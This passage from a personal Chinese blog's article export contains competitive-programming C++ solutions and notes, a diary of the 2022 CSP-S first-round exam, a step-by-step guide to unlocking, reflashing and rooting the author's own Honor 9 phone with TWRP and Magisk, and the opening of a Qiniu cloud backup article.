i=1;i<=n;i++){\n\t\tif(fin[i].opt==1){\n\t\t\tfin[i].id=i;\n\t\t\tto_uni[i]=uni[fin[i].value];\n\t\t}\n\t}\n\t//排序，恢复原来排序\n\tsort(fin+1,fin+n+1,cmp2);\n\t//给删除操作分配id\n\tfor(int i=1;i<=n;i++){\n\t\tif(fin[i].opt==1){\n\t\t\tpre[fin[i].id]=id[fin[i].value];\n\t\t\tid[fin[i].value]=fin[i].id;\n\t\t}else{\n\t\t\tfin[i].id=id[fin[i].value];\n\t\t\t//cout<<\"<<\"<<fin[i].id<<endl;\n\t\t\tid[fin[i].value]=pre[id[fin[i].value]];\n\t\t}\n\t}\n\n\tfor(int i=1;i<=n;i++){\n\t\tif(fin[i].opt==1){\n\t\t\tupdate(1,1,n,fin[i].id,1);\n\t\t\ttota+=uni[fin[i].value];\n\t\t\tnow++;\n\t\t}else{\n\t\t\tupdate(1,1,n,fin[i].id,-1);\n\t\t\ttota-=uni[fin[i].value];\n\t\t\tnow--;\n\t\t}\n\t\tsum1=sum2=cnt1=cnt2=0;\n\t\tcollect1(1,1,n);\n\t\tcollect2(1,1,n);\n\t\tif(abs(sum1-(tota-sum1))<abs(sum2-(tota-sum2))){\n\t\t\tcout<<now-cnt1<<' ';\n\t\t}\n\t\tif(abs(sum1-(tota-sum1))>abs(sum2-(tota-sum2))){\n\t\t\tcout<<cnt2<<' ';\n\t\t}\n\t\tif(abs(sum1-(tota-sum1))==abs(sum2-(tota-sum2))){\n\t\t\tcout<<min(now-cnt1,cnt2)<<' ';\n\t\t}\n\t}\n\treturn 0;\n}\n\n/*\n8\n3 4 5 3 3 -3 -3 4\n*/\n```\n\n### T3:最小化乘积\n\n```cpp\n#include<iostream>\n#include<cstdio>\n#include<cstring>\n#include<algorithm>\n#include<queue>\n#define int long long\nusing namespace std;\n\ninline int read(){\n\tint res=0,ch=getchar(),f=1;\n\twhile(!isdigit(ch) and ch!=EOF){\n\t\tif(ch=='-') f=-1;\n\t\tch=getchar();\n\t}\n\twhile(isdigit(ch)){\n\t\tres=(res<<3)+(res<<1)+(ch-'0');\n\t\tch=getchar();\n\t}\n\treturn res*f;\n}\n\nstruct Point{\n\tint x,y;\n\tPoint(int _x,int _y){\n\t\tx=_x;y=_y;\n\t}\n};\ninline Point getmin(Point a,Point b){\n\tint sa=a.x*a.y;\n\tint sb=b.x*b.y;\n\tif(sa<sb) return a;\n\treturn b;\n}\n\nstruct Edge{\n\tint to,next,wa,wb;\n} edge[40004];\nint head[10004],size;\ninline void add(int u,int v,int wa,int wb){\n\tsize++;\n\tedge[size].to=v;\n\tedge[size].wa=wa;\n\tedge[size].wb=wb;\n\tedge[size].next=head[u];\n\thead[u]=size;\n}\n\nint dis[10004],vis[10004];\nint suma[10004],sumb[10004];\nint s,t;\nPoint dijkstra(Point A,Point B){\n\tmemset(dis,0x3f,sizeof(dis));\n\tmemset(vis,0,sizeof(vis));\n\tmemset(suma,0,sizeof(suma));\n\tmemset(sumb,0,sizeof(sumb));\n\tqueue<int> q;\n\tdis[s]=0;\n\tq.push(s);\n\twhile(!q.empty()){\n\t\tint now=q.front();q.pop();\n\t\tvis[now]=false;\n\t\tfor(int i=head[now];i;i=edge[i].next){\n\t\t\tint to=edge[i].to;\n\t\t\tint w=(B.x-A.x)*edge[i].wb+(A.y-B.y)*edge[i].wa;\n\t\t\tif(dis[now]+w<dis[to]){\n\t\t\t\tdis[to]=dis[now]+w;\n\t\t\t\tsuma[to]=suma[now]+edge[i].wa;\n\t\t\t\tsumb[to]=sumb[now]+edge[i].wb;\n\t\t\t\tif(!vis[to]){\n\t\t\t\t\tvis[to]=true;\n\t\t\t\t\tq.push(to);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn Point(suma[t],sumb[t]);\n}\n\nPoint ans(0x3f3f3f3f,0x3f3f3f3f);\nvoid solve(Point a,Point b){\n\tPoint c=dijkstra(a,b);\n\tans=getmin(ans,c);\n\tint tx=b.x-a.x;\n\tint ty=b.y-a.y;\n\tint fx=c.x-a.x;\n\tint fy=c.y-a.y;\n\tif(tx*fy-ty*fx>=0) return;\n\tsolve(a,c);\n\tsolve(c,b);\n}\n\nint n,m;\nsigned main(){\n\tn=read(),m=read(),s=read(),t=read();\n\tfor(int i=1;i<=m;i++){\n\t\tint u=read(),v=read(),a=read(),b=read();\n\t\tadd(u,v,a,b);\n\t\tadd(v,u,a,b);\n\t}\n\tPoint a=dijkstra(Point(0,1),Point(0,0));\n\tPoint b=dijkstra(Point(0,0),Point(1,0));\n\tans=getmin(a,b);\n\tsolve(a,b);\n\tcout<<ans.x*ans.y;\n\treturn 0;\n}\n\n/*\n4 5 1 4\n1 2 2 3\n1 3 3 3\n1 4 5 5\n2 4 3 1\n3 4 1 3\n*/\n```\n\n### T4:字典序排名\n\n```cpp\n#include<iostream>\n#include<cstdio>\n#include<algorithm>\n#include<cstdlib>\n#include<cstring>\n#include<cmath>\n#define fre(z) freopen(z\".in\",\"r\",stdin),freopen(z\".out\",\"w\",stdout)\nusing namespace std;\nconst int N=3010;\nlong long f[N][N];\n//f[i][j]\n//从j位置开始，包括j位置，再一直到最后，总共多少种情况（对序列排名贡献）\n//i表示已经匹配了多少个子序列，因为这一维有后效性\nint a[N],b[N],pre[N];\nint main() {\n\tint i,n,m,j,k,p;char c;long long Q;\n\twhile ((c=getchar())<'1'||'9'<c);\n\ta[n=1]=c-'0';\n\twhile ('1'<=(c=getchar())&&c<='9') a[++n]=c-'0';\n\twhile ((c=getchar())<'1'||'9'<c);\n\tb[m=1]=c-'0';\n\twhile ('1'<=(c=getchar())&&c<='9') b[++m]=c-'0';\n\tf[n+1][m+1]=1;\n\tcin>>Q;\n\n\t//对f进行最大值限制：Q+1\n\t//因为我们不希望从头开始枚举得到ans，这样的话我们还需要求出t序列的排名\n\t//最后求ans的时候是从t的基础上枚举\n\t//实际上，有了最大值限制，保证整个计算不会爆long long。\n\t//枚举时，如果Q大于贡献值，就减去，最大值限制这个行为没有产生影响\n\t//\t\t  如果Q小于，那么当前枚举的数就枚举对了，就进一步细化ans序列，最大值限制也没有产生影响\n\n\t//由于i下标从1开始枚举，实际上第一个位置，不包括第一个位置，之前，是有0个数在s序列中被选择\n\t//所以i的实际意义是前面选择了x+1个数，需要把i下标-1才是实际意义\n\tfor (j=m;j;j--) f[n+1][j]=min(f[n+1][j+1]*9,Q+1);\n\t//s序列前面枚举完了，再往后面每一位都*9即可，没有s序列的限制带来的麻烦了\n\n\tfor (i=n;i;i--)\n\t\tfor (j=m;j;j--)\n\t\t\tf[i][j]=min(f[i][j+1]*8+f[i+1][j+1],Q+1);\n\t//i是j位置之前，不包括j位置，选了多少个s序列\n\t//j这个位置选其余8个数，8种情况，且i不加1\n\t//j这个位置又往后选了个在s序列里的数，一种情况，i+1\n\n\tfor(int i=1;i<=n;i++){\n\t\tfor(int j=1;j<=m;j++){\n\t\t\tcout<<f[i][j]<<' ';\n\t\t}\n\t\tcout<<endl;\n\t}\n\n\tfor (i=1;i<=m;i++) pre[i]=pre[i-1]+(b[i]==a[pre[i-1]+1]);\n\n\n\tfor (j=m;j;j--) {\n\t\tfor (k=b[j]+1;k<=9;k++){//确保排名比t序列大\n\t\t\t//cout<<\"[\"<<j<<\"]->\"<<k<<\",p:\"<<pre[j-1]+(k==a[pre[j-1]+1])+1<<\",q\"<<Q<<endl;\n\t\t\t//最后的+1是实际情况转换为约定情况\n\t\t\tif (Q<=f[pre[j-1]+(k==a[pre[j-1]+1])+1][j+1]) {\n\t\t\t\t//枚举位置之前的数都原封不动\n\t\t\t\tfor (i=1;i<j;i++) printf(\"%d\",b[i]);printf(\"%d\",k);\n\t\t\t\tp=pre[j-1]+(k==a[pre[j-1]+1]);\n\t\t\t\tfor (++j;j<=m;j++,p+=k==a[p+1])\n\t\t\t\t\tfor (k=1;k<=9;k++)\n\t\t\t\t\t\tif (Q<=f[p+(k==a[p+1])+1][j+1]) {\n\t\t\t\t\t\t\tprintf(\"%d\",k);\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse Q-=f[p+(k==a[p+1])+1][j+1];\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\telse Q-=f[pre[j-1]+(k==a[pre[j-1]+1])+1][j+1];\n\t\t}\n\t}\n}\n```\n\n","summary":"高二时准备csp前打的模拟赛的一些错误总结","key":["csp","模拟赛","错误总结","51nod","清北学堂"],"tags":[],"path":["算法竞赛","做题、VP","csp前模拟赛错误总结.md"],"background":"https://www.caiwen.work/wp-content/uploads/2022/09/0ed357bab5483ff440243c926d4fd2cd.jpeg","recommend":false,"status":"published"},{"type":"Article","title":"2022 CSP-S1游记","id":"csps1","createTime":"2022-09-30T03:08:00.000Z","updateTime":"2025-09-05T13:34:04.855Z","content":"\n## 2022.9.？-2022.9.16\n\n马上就要初赛了，教练打印了历年的真题让我们抽空做一下。选择题比较好，差不多做一道对一道，偏数学。阅读程序一看人就麻了，看不懂，感觉很麻烦的样子。先做的csp2021的题，csp2021感觉非常困难，甚至出现了笛卡尔树（不懂明明st表就可以解决的为什么要用笛卡尔树+st表，而且笛卡尔树是省选内容吧），估分59.5。然后做了一下csp2019的题，2019年的题就比较简单了，代码都不超过100行，而且差不多能看懂代码想要干什么，估分80+。做完感觉找到路子：题目给的代码一般都是要解决某个问题的，题目完全搞懂不太现实，连蒙带猜就可以得到大部分的分。然后做了下csp2020的题，估分70+。\n\n后面发现，初赛的选择题有一些是几年前考过的题。然后就顺手做了2018,2017,2016年的初赛选择题。但马上就要初赛了，时间不太够的样子，2015-2013年的题就直接看题背答案了，如果今年出原题就直接把答案背上去。\n\n## 2022.9.17\n\n最后一节晚自习复习了一下组合数学的公式，排序算法复杂度和稳定性，主定理，原码反码补码这些大概率会考到的知识\n\n## 2022.9.18\n\n竟然选在9.18考试。\n\n中午在洛谷上看普及组初赛的情况。今年由于疫情，大多数省份都是线上考试，HE也不例外。上午普及组有很多出问题的，吸取了一下教训。\n\n**13：40**\n\n虽然是线上考试，但还是有科协的人来机房监考。教练打印好准考证，监考老师来之后我们就在机房外等待入场。\n\n**13：58**\n\n进场。先发了草稿纸，然后签了三张签到表。接着等待考试开始。\n\n**14:20**\n\n监考老师展示了装有账号密码的信封的密封情况，然后发了账号密码。监考员说可以进入考试系统了。然而把账号密码输入进去，说用户不存在。当时心沉了一下，该不会初赛就完了吧。还好别人反应提示用户不存在，或许开考后才能登入系统。\n\n**14:30**\n\n看着电脑右下角时间的指针从14:29到14:30，再次尝试登陆考试系统。然而还是老样子。监考老师表示全省都是这个情况，正在处理，耽误的时间会补上。ccf真的可以。\n\n**14:50**\n\n中间一直尝试登陆，但总是提示用户名不存在。到50左右的时候监考老师通知考试系统网址有变动。说完网址我就赶紧在地址栏输入，并成功登陆进去了。还好快了一点，不然就进不去了。\n\n开始答题\n\n**14:50 - 14：35**\n\nt1考linux，这个我可太会了\n\nt2蒙了个real time，感觉是阅读题\n\nt3t4都是比较常规的\n\nt5没看懂，感觉没什么影响，选了个字最多的就跑了\n\nt6感觉也是阅读题\n\nt7在纸上画了好几个3叉树，应该是找规律，但没找到，蒙了个答案走了\n\nt8出题人比较良心，b选项显然错误\n\nt9带了个特殊值\n\nt10t11今年组合数学的题好简单\n\nt12和前面一年的题相似，模拟了一会就选上了\n\nt13第3行考到j=0，j\\*=2就蒙了，这应该出错了吧，今年初赛可太行了，不过可以猜到出题人想让你选b\n\nt14也带了特殊值，走了\n\nt15挺恶心，在草稿纸上模拟了半天。不过很庆幸最后得数选项里竟然有，不管对不对了，选上就走人\n\n第一道阅读程序感觉好良心，代码够短。不过一眼没看懂代码表示什么意思。从t16和t17两个数据耐心模拟了一下，发现类似find函数的功能，t20顺手也出来了。t18t19t21凭感觉选上了\n\n第二道阅读程序一眼也没看懂。按t25的数据模拟了一下，发现了是类似排序的一种效果。根据模拟过程中各个数字位置的变化，个人觉得算法应该是稳定的。k取无穷大时，有个地方是类似于开了个桶，t23t27就选上了。t26发现k取10循环次数最少，就选上了。t24蒙了一下\n\n（发现今年竟然没考主定理）\n\n第三题代码竟然更短。模拟了t31t32t33直接模拟，最后发现算出来的答案竟然选项都有，做的很顺。t28t30依然是蒙了个，t29显然错的\n\n第一道完善程序感觉没看懂，但t35t36t37t38选项都是对称的，对了一个就全对了，错了一个就全错了。没看懂，草草蒙完走人（后来对答案发现都错了）\n\n**14:35 - 14:50**\n\n还剩最后一道阅读程序，感觉有点紧张。不过还好这个阅读程序的题貌似在洛谷上做过。很熟悉的dfs，几分钟就选完了。\n\n做完之后拿尺子在屏幕上比着核对了一下答案。重复交了几遍\n\n个人感觉今年的选择题比往年困难。后面的题比往年简单的多\n\n## 2022.9.19\n\n中午去机房，在洛谷上的自测对了一下答案，民间数据，估分79.5，还是没上80.\n\n## 2022.9.27\n\n中午出分，竟然比估分高，82.5\n\n## 2022.9.29\n\n全国分数线发布，64分就一等了。获得人生中第一个奖项（虽然不值钱）。\n\n","summary":"参加CSP2022-S第一轮的游记","key":["csp","游记"],"tags":[],"path":["记录","2022 CSP-S1游记.md"],"background":"https://www.caiwen.work/wp-content/uploads/2022/09/m1.png","recommend":false,"status":"published"},{"type":"Article","title":"noip做题笔记","id":"zuo-ti-bi-ji","createTime":"2022-08-31T03:06:00.000Z","updateTime":"2025-09-05T13:34:06.251Z","content":"\n1. P2822\n\n用帕斯卡定理递推组合数，递推的时候判断是否为k的倍数，然后利用二维前缀和。这些都想到了，但是判断为k的倍数被难到了，因为直接把所有的组合数求出来显然会爆long long，需要模一个数。想到这就没头绪了。看到题解恍然大悟，可以直接模k，为0即为k的倍数，并且可以很好地与递推结合\n\n2. P1450\n\n上来就写了一个类似多重背包的dp，虽然复杂度很大，但还是希望能骗到一定的分数，然后全都tle了...\n\n看了题解之后发现是容斥\n\n我们首先可以预处理出没有数量限制的情况，也就是完全背包  \n然后再减去不符合要求的情况。先考虑有一种硬币不符合要求，不符合要求的方案数为 $dp[s-(d_i+1)*c_i]$ 。可以看作：我先强制选择 $d_i+1$ 个硬币，这样之后不管你怎么去选硬币，都是不符合条件的。\n\n再应用容斥原理即可\n\n3. \\*P5664\n\n容斥、dp\n\n因为每列选择有限制，所以考虑容斥。首先考虑总方案数\n$$g_{i,j}=g_{i-1,j}+s_i*g_{i-1,j-1}$$\n（$s_i$表示第i行数的总和）\n\n表示前i行选了j个数的总方案数\n\n然后考虑不合法方案数,对每一列（记枚举到的列为col），都有\n\n$$f_{i,j,k}=f_{i-1,j,k}+a_{i,col}*f_{i-1,j-1,k}+s_i*f_{i-1,j,k-1}$$\n\n表示前i行，在当前列选择了j个，在其他列选择了k个的方案数  \n这样做的复杂度是 $O(mn^3)$ 的。实际上我们不关心j和k的具体数值，所以可以简化状态\n\n$$_{i,j}=f_{i-1,j}+a_{i,col}*f{i-1,j-1}+s_i*f_{i-1,j+1}$$\n\n表示前i行，当前列选择个数比其他列多j个的情况\n\n4. P1279\n\n字符串距离型dp\n\n状态转移方程：\n\n$$f[x][y]=min(f[x-1][y]+k,f[x][y-1]+k,f[x-1][y-1]+abs(a[x]-b[y]))$$\n\n初始化：\n\n$f[0][i]=f[i][0]=k*i$\n\n注意i可以取到0，即 $f[0][0]=0$\n\n相似题目：P1140、P2758、P2268\n\n5. P1717\n\n一开始把状态设成 $f[i][j]$ 表示第i个分配j个单位时间最多收益。很显然不符合动态规划的特点，走火入魔了属于是\n\ni的含义应该是前i个池塘\n\n状态转移方程：\n\n$$dp[i][j]=max(dp[i-1][j-t[i-1]-k]+f[i]+(f[i]-1*d[i])+(f[i]-2*d[i])+...+(f[i]-(k-1)*d[i]))$$\n\nk是分配给当前第i个池塘的单位时间\n\nk的取值范围：$j-t[i-1]-k>=0$ 且 $f[i]-(k-1)*d[i]>=0$\n\n利用等差数列求和公式，得到\n\n$$dp[i][j]=max(dp[i-1][j-t[i-1]-k]+k*f[i]-\\frac{k(k-1)}{2}d[i]$$\n\n","summary":"在准备noip时写的一些做题笔记","key":["noip","笔记"],"tags":[],"path":["算法竞赛","做题、VP","noip做题笔记.md"],"background":"https://pic.caiwen.work/i/2025/01/22/67909e51b8f1c.jpg","recommend":false,"status":"draft"},{"type":"Article","title":"荣耀9：从EMUI5升级到EMUI9，刷入类原生并刷入Magisk","id":"huawei_honor_9","createTime":"2022-08-23T03:03:00.000Z","updateTime":"2025-09-05T13:34:05.594Z","content":"\n华为手机解锁bl锁似乎一直都只能依赖淘宝付费解锁。我在前天发现了一种不需要花任何钱就可以解bl锁的方法，为此我突然想玩一下刷机。但中间遇到了一些问题，写个文章记录一下。\n\n::: info 注意\n\n我所使用的是华为荣耀9，型号为STF-AL10。其他型号的手机也可以参考本文的思路\n\n:::\n\n一般来说荣耀9都会有emui8或者emui9，甚至鸿蒙系统的系统推送。但是需要申请，而花粉俱乐部现在已经死了。我的手机一直没有收到推送，还处于emui5版本。\n\n## 解锁bootloader\n\n对于处理器为麒麟960及以下的华为手机，我们可以使用一个叫PotatoNV的工具，强行向手机中注入一个解锁码，这样我们就可以用注入的解锁码来解锁bootloader\n\n首先安装驱动，https://syxz.lanzoui.com/iS6s0nq4ofc\n\n然后进入PotatoNV的项目地址，https://github.com/mashed-potatoes/PotatoNV\n\n其中可以看到支持的CPU和肯定不支持的CPU，荣耀9的CPU是麒麟960，刚好支持\n\n![支持的](https://www.caiwen.work/wp-content/uploads/2022/08/QQ%E6%88%AA%E5%9B%BE20220823082322.png)\n\n![肯定不支持的](https://www.caiwen.work/wp-content/uploads/2022/08/QQ%E6%88%AA%E5%9B%BE20220823082332.png)\n\n在右侧Releases中下载\n\n然后，我们需要将手机短接。需要将手机后盖拆开，并找一个能导电的东西来短接。建议选择镊子，但我这里没有镊子，就找了个铜丝\n\n你需要有一张TP短接图来告诉你短接哪个位点。对于荣耀9，我这里找到了一个\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ%E6%88%AA%E5%9B%BE20220823083338.png)\n\n上图的意思是，你需要将导体（我这里是铜丝）的一端接触图上画红圈的点，然后另一端往旁边金属壳随便一接触即可。\n\n注意，你需要在手机关机状态下，数据线不可以连接电脑，然后短接，不能只短接一下，你需要一直让导体接触这两个地方，然后再连接数据线。你可以提前打开设备管理器观察。当连接数据线时，如果设备管理器出现下面这个东西，说明短接成功。\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ%E6%88%AA%E5%9B%BE20220821133550.png)\n\n接着你就可以打开PotatoNV，选择好Target device和处理器，点击Start就会进行解锁码注入\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ%E5%9B%BE%E7%89%8720220823084121.png)\n\n保存好你的解锁码，以后可能还会用\n\n接着就可以解锁bl了。下载工具箱：https://pan.baidu.com/s/1u4rHv2r6vjWCuiulgaqTiA，提取码：myty\n\n启动手机，将手机连接到电脑，确保usb调试打开，然后打开工具箱，点击解除bootloader，输入解锁码并确定。如果一切顺利的话手机会重启进入fastboot模式，询问你是否要解锁bl，选择YES即可\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ%E6%88%AA%E5%9B%BE20220821205732.png)\n\n如果没有重启，你可以自行进入fastboot模式。\n\n::: success 一个比较优雅的进入fastboot的方法\n在关机状态下，不连接数据线，按住音量-键，不按电源键，然后再把数据线插进去，就可以100%进入fastboot模式\n:::\n\n.\n\n::: warn 注意\n\n开启bl锁之后，手机每次开机都会出现警告，但无伤大雅。当你解锁bl后，手机会自动进行恢复出厂设置，注意数据的备份\n:::\n\n## 升级到EMUI8\n\n如果想要刷入类原生系统，则必须需要手机支持ProjectTreble。而这个东西是安卓8才有的.为此我们需要先升级到emui8\n\n### 刷入TWRP\n\n对于emui5，网上可用的twrp比较少（大多数都是emui8的twrp，不能用到emui5上），这里我用的是KVIP的twrp，链接：https://pan.baidu.com/s/1hsABt20\n\n下载完成后，点击其中的Run.bat按照提示进行刷入即可。\n\n::: info 注意\n我在xda论坛看到，这个twrp的作者由于没有对应的设备，所以没有进行测试。实际上，这个twrp并不支持中文，而且也不能挂载手机的分区。但我们后面会想办法解决\n:::\n\n.\n\n::: warn 注意\n\n刷入之后手机的触摸按键和手电筒将不可用。不过你可以选择使用悬浮按钮来代替触摸按键。相关问题的修复方法可以参考：\n\nhttps://forum.xda-developers.com/t/oreo-twrp-3-2-1-0-0-3-capacitive-fix.3754483/\n\n:::\n\n### 刷入EMUI8\n\n我们需要准备emui8的强刷包，链接：https://pan.baidu.com/s/1Ia8Q0MSgBArdZjieQbWgEQ\n\n> 荣耀9 EMUI8.0 B350官方固件包\n>\n> 公共文件一：下载 update.zip 不用改名\n> http://update.hicloud.com:8180/TDS/data/files/p3/s15/G2310/g1699/v150213/f1/full/update.zip\n>\n> 公共文件二：下载 update_data_full_public.zip 并改名为：update_data_public.zip\n> http://update.hicloud.com:8180/TDS/data/files/p3/s15/G2310/g1699/v150213/f1/full/public/update_data_full_public.zip\n>\n> 公共文件三：根据自己的手机型号下载对应文件，并改名为：update_all_hw.zip（手机型号可以在：”设置-关于手机里面“看到，或者手机背后可以看到）\n>\n> 型号：STF-AL10 下载此文件并改名为：update_all_hw.zip\n> http://update.hicloud.com:8180/TDS/data/files/p3/s15/G2310/g1699/v150213/f1/full/STF-AL10_all_cn/update_full_STF-AL10_all_cn.zip\n>\n> 型号：STF-AL00 下载此文件并改名为：update_all_hw.zip\n> http://update.hicloud.com:8180/TDS/data/files/p3/s15/G2310/g1699/v150213/f1/full/STF-AL00_all_cn/update_full_STF-AL00_all_cn.zip\n>\n> 型号：STF-TL10 下载此文件并改名为：update_all_hw.zip\n> http://update.hicloud.com:8180/TDS/data/files/p3/s15/G2310/g1699/v150213/f1/full/STF-TL10_cmcc_cn/update_full_STF-TL10_cmcc_cn.zip\n\n如果你直接点进这个链接进行下载的话，会弹出下面这个界面\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ%E6%88%AA%E5%9B%BE20220823091646.png)\n\n你需要使用迅雷。将你要下载的文件先离线下载到迅雷云盘上，再从迅雷云盘上下载（迅雷云盘好像不限速，好评\n\n再下载HuRUpdater，https://pan.baidu.com/s/1KqLBhbhtIzwMSyeKMjpESA?fid=653326701347000\n\n这些都下载完后，按照上面所说的修改文件名，并把这四个文件放到一个文件夹中，并复制到u盘（或者sd卡都可以）\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ%E6%88%AA%E5%9B%BE20220823092112.png)\n\n然后将u盘通过otg线连接到手机。进入twrp，点击”Mount“，将其中的”USB OTG“打上对勾。然后返回，点击”Install“，选择u盘中的HuRUpdater_0.3.zip进行刷机。脚本执行完毕之后，就可以进入手机了。\n\n你会发现系统成功升级为emui8，并且数据甚至都没有丢失\n\n### 使用更好的TWRP\n\n刷入emui8之后，之前刷入的twrp就会被新的官方recovery覆盖。如果你还需要使用twrp的话，你可以再刷一个更好用的twrp\n\n你可以到这里：https://cloud.189.cn/web/share?code=7r6BfmBvEFvi 下载由wzsx150大神适配的twrp。下载后依然可以直接使用压缩包内自带的bat脚本进行刷入。这里不多解释\n\n值得注意的是，如果你是emui5的话，你是不能直接刷入这个twrp的。这就是为什么我们要先刷一个差点的twrp然后升级到emui8\n\n### 救砖\n\nemui8已经可以支持ProjectTreble了，于是我直接用twrp将DotOS直接刷到system分区，手机就不断进行重启了。并且rec进不去，卡在启动界面。erecovery也不能恢复。三键强刷也没有成功。\n\n这时候你需要另一个神奇的twrp\n\n链接：https://pan.baidu.com/s/1FAWCr-snmD9C0GhSZzcPqA?pwd=t0pd\n提取码：t0pd\n\n下载后，将手机进入fastboot模式并连接电脑，在命令行中输入fastboot flash recovery_ramdisk 文件路径 进行刷入，然后重启进入recovery模式，就进到了这个twrp了\n\n你可以在这个twrp中再次重复上面的步骤把emui8刷进去\n\n## 升级到EMUI9\n\n首先你需要官方固件包。在万维论坛中可以找到。链接：https://www.rom100.com/forum.php\n\n你可以在其中搜索你的手机型号，就可以找到对应的固件包\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ%E6%88%AA%E5%9B%BE20220823094755.png)\n\n但是你需要回复帖子才能获得下载链接，而回复需要登录，等于需要邀请码，邀请码付费。你可以去加一些有关刷机的群，在群里向大佬们借一个论坛账号。我在这里给到我所用的固件包的下载链接\n\n链接：https://pan.baidu.com/s/1bEU-GzU2JCg1KTi7JdffDQ?pwd=d1wp\n提取码：d1wp\n\n（可能会有解压密码，解压密码就是压缩包里有个没扩展名的文件的文件名）\n\n::: info “高维禁用”\n”高维禁用“指的是这个固件包是华为高级维修店专用的刷机包，禁止公开的意思。可以不用理会这四个字\n:::\n\n使用百度云下载速度很是问题。我最终选择向百度云妥协，交了25块钱。如果你不想向百度云妥协，你可以选择antdownload，目前可用的一个下载百度云工具\n\n链接：https://www.aliyundrive.com/s/sjwN7DRipCU\n提取码：6666\n\n下载完毕后，解压，将压缩包中的dload文件夹复制到u盘上。然后，进入twrp，选择”安装“。先点击”update_sd.zip“，然后，再添加一个压缩包，再把”update_sd_STF-AL10_all_cn.zip“加进去，再进行刷入。\n\n如果你u盘速度比较慢的话，会卡在”skipping digest check: no digest file found“这里。如果一小时之后，或者手机电量快不足了，还卡在这里没有动静，你就可以直接把u盘拔掉重启。重启后就是emui9了\n\n如果在刷的时候报错，出现了一堆红字，并且最终显示”Fail”的话，不去管他，直接重启，就进入emui9了\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ%E6%88%AA%E5%9B%BE20220823103605.png)\n\n## 刷入类原生\n\n在刷入类原生之前，你需要确保recovery是官方的recovery，这很重要！\n\n首先下载treble check，链接：https://www.cr173.com/soft/938868.html\n\n安装后可以看到系统是否支持ProjectTreble。实际上emui8及以后的版本都支持\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ%E5%9B%BE%E7%89%8720220823101815-scaled.jpg)\n\n比如我这个是这样的。虽然是A Only分区，但是由于System-as-root的存在，还是需要刷入AB的GSI的包。\n\n你可以去网上自行寻找想刷的类原生系统。我这里使用Havoc OS 2.9。\n\n一般你会下载到一个.xz格式的文件，使用压缩工具解压，得到.img文件。将手机进入fastboot模式，连接电脑，输入 `fastboot flash system` 文件路径 即可进行刷入\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ%E5%9B%BE%E7%89%8720220823102559.jpg)\n\n如果出现cannot load错误，如下图，你可能需要换一个类原生系统\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ%E5%9B%BE%E7%89%8720220823102516.png)\n\n刷完后直接重启即可。\n\n如果手机不断黑屏由重启，那么可能有下面原因\n\n- 你刷的系统和你原来的系统的安卓版本对不上。比如我拿emui8刷havoc就无限重启。但是升级到emui9就可以正常刷入了\n\n- 没有清理data分区。你需要清理data分区。但是不要使用twrp上的清理data分区。你需要在官方recovery中选择恢复出厂设置，这就是为什么要保持rec为官方的\n\n- 你刷的类原生系统不适配你的手机\n\n此时你可能需要按照上面所说的救砖步骤，重新刷回emui了\n\n由于我刷完havoc，系统非常不稳定，有一堆问题，所以选择回到EMUI9了\n\n## 刷入面具\n\n首先你需要解包工具，链接：http://www.mz6.net/soft/18553.html#downurl\n\n下载完毕后打开工具，你需要先按照如下设置\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/%E6%8D%951%E8%8E%B7.png)\n\n然后，在你之前下载到的”update_sd.zip“中，将”UPDATE.APP“解压出来，然后用这个解包工具打开”UPDATE.APP“，在其中找到这个\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/%E6%8D%95%E8%8E%B7.png)\n\n右键，将其提取出来并传到手机上\n\n接着，在手机中安装Magisk，点击”安装“，”下一步“，”选择并修补一个文件“，选择刚才提取出来的那个文件。等待Magisk修复完之后，再把修复好的文件传到电脑上\n\n手机进入fastboot模式，连接到电脑，命令行输入 `fastboot flash recovery_ramdisk` 文件路径 把面具修复好的rec刷进去。注意，刷完之后重启不能直接进入系统，你必须要首先进入recovery模式，进去之后面具会自动引导你进入系统，并成功安装好面具。\n\n如果你手残直接进入了系统，你需要重新刷一遍recovery\n\n::: info 补充\n网上大多数面具安装教程都是修补boot.img。但你会发现使用解包工具，没有看到boot.img。实际上，华为对此进行了魔改，你只需要修复recovery即可。另外，如果你强行使用将boot.img导出并用面具修补，然后在刷入，你的手机会变砖\n:::\n\n## 参考\n\n- https://zhuanlan.zhihu.com/p/397173427\n\n- http://www.rootbbs.com/?id=343\n\n- 【【全网首发】华为刷机入门【保姆级教程】华为手机刷机-魔鬼级难度刷机-小白也能看懂！】 https://www.bilibili.com/video/BV1HV4y1E7uo?share_source=copy_web\n\n- 【玩机必看！带你入坑安卓刷机，小白也能看懂的ROOT基础指南来啦！】 https://www.bilibili.com/video/BV1BY4y1H7Mc?share_source=copy_web\n\n- https://www.bilibili.com/read/cv15133756\n\n","summary":"将华为荣耀9手机从EMUI5升级到EMUI9，刷入类原生并刷入Magisk","key":["华为","荣耀9","emui","刷机","root","magisk","类原生"],"tags":[{"value":"精选","color":"success"}],"path":["刷机","荣耀9：从EMUI5升级到EMUI9，刷入类原生并刷入Magisk.md"],"background":"https://www.caiwen.work/wp-content/uploads/2022/08/QQ截图20220823103605.png","recommend":true,"status":"published"},{"type":"Article","title":"使用七牛云备份网站","id":"qiniu_backup","createTime":"2022-08-12T10:51:00.000Z","updateTime":"2025-09-05T13:34:04.993Z","content":"\n由于想要在服务器上登录qq，所以把服务器的系统换成了windows系统。宝塔面板似乎不想支持windows系统（在windows系统上从来没有安装成功过），所以使用了php_study来搭建网站。而在之前使用宝塔面板的时候由于担心服务器跑路，所以使用了宝塔的七牛云备份插件，每天定时备份到七牛云储存。现在换到了windows系统上，需要自己实现一个七牛云备份的功能。\n\n## 